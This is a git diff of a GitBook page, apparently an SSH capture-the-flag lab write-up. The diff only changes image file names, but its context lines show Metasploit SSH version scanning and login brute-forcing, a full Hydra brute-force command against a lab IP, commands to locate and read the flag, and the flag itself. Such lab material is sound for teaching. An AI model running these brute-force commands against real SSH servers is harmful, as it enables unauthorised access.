@@ -47,7 +47,7 @@ msf5 auxiliary(scanner/ssh/ssh_version) > run
 [*] Auxiliary module execution completed
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Brute-Force - Metasploit <a href="#brute-force" id="brute-force"></a>
 
@@ -64,7 +64,7 @@ msf5 auxiliary(scanner/ssh/ssh_login) > set VERBOSE true
 msf5 auxiliary(scanner/ssh/ssh_login) > exploit 
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Brute-Froce - Hydra
 
@@ -72,7 +72,7 @@ msf5 auxiliary(scanner/ssh/ssh_login) > exploit
 hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt -t4 192.142.193.3 ssh
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Login to the target via SSH
 
@@ -89,7 +89,7 @@ find / -name "flag"
 cat /flag
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
 Flag: `eb09cc6f1cd72756da145892892fbf5a`
